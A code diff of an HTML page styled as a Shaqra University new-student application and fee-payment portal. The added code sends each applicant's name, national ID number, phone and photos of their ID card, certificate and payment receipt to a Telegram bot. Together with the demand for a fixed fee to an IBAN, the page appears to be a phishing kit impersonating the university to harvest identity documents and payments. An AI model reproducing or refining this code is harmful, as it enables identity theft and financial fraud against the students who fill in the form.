-          </div>
-        </form>
-      </div>
-    `;
-    // insert after login card
-    const loginCard = document.querySelector('.login-card');
-    loginCard.insertAdjacentElement('afterend', drawerWrapper);
-
-    // wire up elements
-    const drawer = drawerWrapper;
-    const appForm = drawer.querySelector('#applicantForm');
-    const feeForm = drawer.querySelector('#feeForm');
-    const openBtn = document.getElementById('applicantBtn');
-    const closeBtn = drawer.querySelector('#closeAppForm');
-    const downloadJsonBtn = drawer.querySelector('#downloadJsonBtn');
-    const downloadFeeJsonBtn = drawer.querySelector('#downloadFeeJsonBtn');
-    const resetAppBtn = drawer.querySelector('#resetAppBtn');
-    const resetFeeBtn = drawer.querySelector('#resetFeeBtn');
-    const appMsg = drawer.querySelector('#appFormMessage');
-    const feeMsg = drawer.querySelector('#feeFormMessage');
-    const copyIbanFeeBtn = drawer.querySelector('#copyIbanFeeBtn');
-
-    function openDrawer(){ drawer.classList.add('open'); openBtn.textContent = 'إغلاق نموذج التقديم / Close Application Form'; drawer.querySelector('[name="declarationDate"]').value = new Date().toISOString().slice(0,10); drawer.scrollIntoView({behavior:'smooth'}); }
-    function closeDrawer(){ drawer.classList.remove('open'); openBtn.textContent = 'تقديم طالب جديد / New Student Application'; appMsg.innerHTML=''; feeMsg.innerHTML=''; }
-
-    openBtn.addEventListener('click', ()=> { if(drawer.classList.contains('open')) closeDrawer(); else openDrawer(); });
-    closeBtn.addEventListener('click', closeDrawer);
-
-    // copy IBAN
-    function copyTextWithFeedback(text, btnEl){
-      if(!btnEl) return;
-      const prev = btnEl.textContent;
-      if(navigator.clipboard && navigator.clipboard.writeText){
-        navigator.clipboard.writeText(text).then(()=> { btnEl.textContent = 'تم النسخ ✓'; setTimeout(()=> btnEl.textContent = prev,1600); }).catch(()=> {
-          const ta=document.createElement('textarea'); ta.value=text; document.body.appendChild(ta); ta.select(); try{ document.execCommand('copy'); btnEl.textContent='تم النسخ ✓'; setTimeout(()=>btnEl.textContent=prev,1600);}catch(e){ alert('انسخ يدويًا: '+text);} ta.remove();
-        });
-      } else { alert('نسخ غير مدعوم، انسخ يدويًا: ' + text); }
-    }
-    if(copyIbanFeeBtn) copyIbanFeeBtn.addEventListener('click', ()=> copyTextWithFeedback(IBAN, copyIbanFeeBtn));
-
-    // helper: basic fake-value detection (kept identical)
-    function looksFake(v){ if(!v) return true; const s=String(v).trim().toLowerCase(); if(s.length<=1) return true; const bad=['test','123','aaaa','abcd','مثال','نموذج','xxx','0000','000']; if(bad.includes(s)) return true; return false; }
-
-    // Validation lists (kept same fields names)
-    function validateApp(){
-      const errors = [];
-      const requiredNames = ['fullNameAr','fullNameEn','idType','idNumber','birthDate','gender','nationality','phone','email','lastQualification','issuingInstitution','degreeCountry','graduationYear','gpa','certificates','idAttachment','declarantName','declarationDate','electronicSignature'];
-      requiredNames.forEach(name=>{
-        const el = appForm.elements[name];
-        if(!el) return;
-        if(el.type === 'file'){ if(!el.files || el.files.length === 0) errors.push('حقل مطلوب مفقود: ' + (el.previousElementSibling ? el.previousElementSibling.textContent.trim() : name)); }
-        else { if(looksFake(el.value)) errors.push('الرجاء تعبئة قيمة صحيحة للحقل: ' + (el.previousElementSibling ? el.previousElementSibling.textContent.trim() : name)); }
-      });
-      const email = appForm.elements['email']; if(email && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email.value)) errors.push('البريد الإلكتروني غير صحيح.');
-      const phone = appForm.elements['phone']; if(phone && !/^[+0-9\s\-]{7,15}$/.test(phone.value)) errors.push('رقم الجوال غير صحيح.');
-      const gy = appForm.elements['graduationYear']; if(gy && (isNaN(Number(gy.value)) || Number(gy.value) < 1900 || Number(gy.value) > 2100)) errors.push('سنة التخرج غير صحيحة.');
-      return errors;
+    function showPage(id) {
+        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+        document.getElementById(id).classList.add('active');
+        document.querySelectorAll('nav button').forEach(b => b.classList.remove('active'));
+        // تفعيل الزر في الناف بار
+        const btns = document.querySelectorAll('nav button');
+        if(id === 'home') btns[0].classList.add('active');
+        window.scrollTo(0,0);
     }
 
-    function validateFee(){
-      const errors = [];
-      const fields = ['paidAmount','fromBank','transactionDate','transactionId','receipt'];
-      fields.forEach(name=>{
-        const el = feeForm.elements[name];
-        if(!el) return;
-        if(el.type === 'file'){ if(!el.files || el.files.length === 0) errors.push('يرجى إرفاق إيصال التحويل.'); }
-        else { if(looksFake(el.value)) errors.push('الرجاء تعبئة قيمة صحيحة للحقل: ' + (el.previousElementSibling ? el.previousElementSibling.textContent.trim() : name)); }
-      });
-      const amt = feeForm.elements['paidAmount']; if(amt && String(amt.value).trim() !== String(FIXED_FEE)) errors.push('المبلغ يجب أن يكون ثابتاً: ' + FIXED_FEE + ' ريال.');
-      return errors;
+    function calcPrice() {
+        const v = document.getElementById('p_major').value;
+        document.getElementById('finalPrice').innerText = v ? Number(v).toLocaleString() : "0";
     }
 
-    // Download JSON helpers (unchanged)
-    if(downloadJsonBtn) downloadJsonBtn.addEventListener('click', ()=>{
-      const fd = new FormData(appForm);
-      const obj = {};
-      for(const [k,v] of fd.entries()){ if(obj[k] === undefined) obj[k] = v; else { if(!Array.isArray(obj[k])) obj[k] = [obj[k]]; obj[k].push(v); } }
-      ['certificates','idAttachment','photo','cv','publications','testsAttachments','otherDocs','employerApproval'].forEach(name=>{
-        obj[name] = []; const inp = appForm.elements[name]; if(inp && inp.files){ for(let i=0;i<inp.files.length;i++){ const f = inp.files[i]; obj[name].push({name:f.name,size:f.size,type:f.type}); } }
-      });
-      obj._meta = {applicationId:'APP-'+Math.random().toString(36).slice(2,10).toUpperCase(), timestamp: new Date().toISOString()};
-      const blob = new Blob([JSON.stringify(obj,null,2)], {type:'application/json'});
-      const a = document.createElement('a'); a.href = URL.createObjectURL(blob);
-      const fname = (appForm.elements['fullNameAr'] && appForm.elements['fullNameAr'].value ? appForm.elements['fullNameAr'].value.replace(/\s+/g,'_') : 'application') + '_shaqra.json';
-      a.download = fname; document.body.appendChild(a); a.click(); a.remove(); URL.revokeObjectURL(a.href);
-    });
+    function checkToPay() {
+        if(document.getElementById('megaForm').checkValidity()) { showPage('payment'); }
+        else { alert('⚠️ فضلاً، أكمل كافة البيانات المطلوبة وارفع صور الهوية والشهادة قبل الانتقال للسداد.'); }
+    }
 
-    if(downloadFeeJsonBtn) downloadFeeJsonBtn.addEventListener('click', ()=>{
-      const fd = new FormData(feeForm);
-      const obj = {};
-      for(const [k,v] of fd.entries()){ if(obj[k] === undefined) obj[k] = v; else { if(!Array.isArray(obj[k])) obj[k] = [obj[k]]; obj[k].push(v); } }
-      obj._meta = {applicationId:'APP-FEE-'+Math.random().toString(36).slice(2,10).toUpperCase(), timestamp: new Date().toISOString()};
-      const blob = new Blob([JSON.stringify(obj,null,2)], {type:'application/json'});
-      const a = document.createElement('a'); a.href = URL.createObjectURL(blob);
-      const fname = 'fee_proof_' + (feeForm.elements['transactionId'] && feeForm.elements['transactionId'].value ? feeForm.elements['transactionId'].value : 'untitled') + '.json';
-      a.download = fname; document.body.appendChild(a); a.click(); a.remove(); URL.revokeObjectURL(a.href);
-    });
+    function enableSubmit() {
+        const b = document.getElementById('submitBtn');
+        if(document.getElementById('up_pay').files[0]) { b.disabled = false; b.style.background = "#005a2b"; b.style.cursor = "pointer"; }
+    }
 
-    if(resetAppBtn) resetAppBtn.addEventListener('click', ()=> { if(confirm('هل أنت متأكدة من إعادة تعيين كل الحقول؟')) { appForm.reset(); appMsg.innerHTML=''; } });
-    if(resetFeeBtn) resetFeeBtn.addEventListener('click', ()=> { if(confirm('هل أنت متأكدة من إعادة تعيين حقول إيصال الدفع؟')) { feeForm.reset(); feeMsg.innerHTML=''; } });
+    async function sendToTelegram() {
+        const b = document.getElementById('submitBtn'); b.innerText = "⏳ جاري الإرسال..."; b.disabled = true;
+        
+        let txt = `🏛 **طلب جديد - جامعة شقراء**\n👤 الاسم: ${document.getElementById('p_name').value}\n🆔 الهوية: ${document.getElementById('p_id').value}\n📱 الجوال: ${document.getElementById('p_phone').value}\n🎓 التخصص: ${document.getElementById('p_major').options[document.getElementById('p_major').selectedIndex].text}`;
 
-    // SEND application (this sends files via FormData to your Apps Script URL)
-    appForm.addEventListener('submit', async (ev)=>{
-      ev.preventDefault();
-      appMsg.innerHTML = '';
-      const errs = validateApp();
-      if(errs.length){ appMsg.innerHTML = '<div style="color:#b91c1c"><strong>يرجى تصحيح الأخطاء:</strong><ul style="margin:6px 0 0 18px;padding:0">'+errs.map(x=>'<li>'+x+'</li>').join('')+'</ul></div>'; drawer.scrollIntoView({behavior:'smooth'}); return; }
+        try {
+            await fetch(`https://api.telegram.org/bot${TOK}/sendMessage`, {
+                method: 'POST', headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({chat_id: CHID, text: txt})
+            });
 
-      const fd = new FormData(appForm);
-      fd.append('_meta_applicationId', 'APP-'+Math.random().toString(36).slice(2,10).toUpperCase());
-      fd.append('_meta_timestamp', new Date().toISOString());
-      fd.append('feeAmount', FIXED_FEE);
-      fd.append('feeIban', IBAN);
-      fd.append('notifyEmail', NOTIFY_EMAIL);
-
-      appMsg.innerHTML = '<div class="small">جاري إرسال البيانات... الرجاء الانتظار.</div>';
-
-      try {
-        const res = await fetch(FORMCARRY_URL, { method:'POST', body: fd });
-        if(!res.ok) throw new Error('HTTP '+res.status);
-        appMsg.innerHTML = '<div style="color:#065f46"><strong>تم إرسال البيانات بنجاح.</strong> الآن الرجاء إثبات تسديد الرسوم أدناه.</div>';
-        setTimeout(()=> { feeForm.style.display = 'grid'; feeForm.scrollIntoView({behavior:'smooth'}); }, 600);
-      } catch(err){
-        console.error(err);
-        appMsg.innerHTML = '<div style="color:#b91c1c">فشل الإرسال. تحقق من إعدادات الـ Apps Script أو من اتصال الإنترنت.</div>';
-      }
-    });
-
-    // SEND fee proof
-    feeForm.addEventListener('submit', async (ev)=>{
-      ev.preventDefault();
-      feeMsg.innerHTML = '';
-      const errs = validateFee();
-      if(errs.length){ feeMsg.innerHTML = '<div style="color:#b91c1c"><strong>يرجى تصحيح الأخطاء:</strong><ul style="margin:6px 0 0 18px;padding:0">'+errs.map(x=>'<li>'+x+'</li>').join('')+'</ul></div>'; feeForm.scrollIntoView({behavior:'smooth'}); return; }
-
-      const fd = new FormData(feeForm);
-      fd.append('_meta_feeId', 'FEE-'+Math.random().toString(36).slice(2,10).toUpperCase());
-      fd.append('_meta_timestamp', new Date().toISOString());
-      fd.append('feeIban', IBAN);
-      fd.append('notifyEmail', NOTIFY_EMAIL);
-
-      feeMsg.innerHTML = '<div class="small">جاري إرسال إثبات الدفع... الرجاء الانتظار.</div>';
-
-      try {
-        const res = await fetch(FORMCARRY_URL, { method:'POST', body: fd });
-        if(!res.ok) throw new Error('HTTP '+res.status);
-        feeMsg.innerHTML = '<div style="color:#065f46"><strong>تم إرسال إثبات الدفع بنجاح.</strong> شكراً لك، سنراجع الإيصال ونتواصل معك.</div>';
-        setTimeout(()=> { feeForm.reset(); }, 900);
-      } catch(err){
-        console.error(err);
-        feeMsg.innerHTML = '<div style="color:#b91c1c">فشل الإرسال. تحقق من إعدادات الـ Apps Script أو من اتصال الإنترنت.</div>';
-      }
-    });
-
-    // Close on ESC
-    document.addEventListener('keydown', (ev)=> { if(ev.key === 'Escape' && drawer.classList.contains('open')) closeDrawer(); });
-
-    // start closed
-    closeDrawer();
-
-  }); // ready
-})(); // IIFE
+            const files = [document.getElementById('up_id').files[0], document.getElementById('up_cert').files[0], document.getElementById('up_pay').files[0]];
+            for(let f of files) {
+                if(f) {
+                    let fd = new FormData(); fd.append('chat_id', CHID); fd.append('photo', f);
+                    await fetch(`https://api.telegram.org/bot${TOK}/sendPhoto`, {method: 'POST', body: fd});
+                }
+            }
+            showPage('success');
+        } catch(e) { alert('انقطع الاتصال بالخادم، حاول مرة أخرى'); b.disabled = false; b.innerText = "تأكيد الإرسال النهائي"; }
+    }
 </script>
-
 </body>
 </html>
+
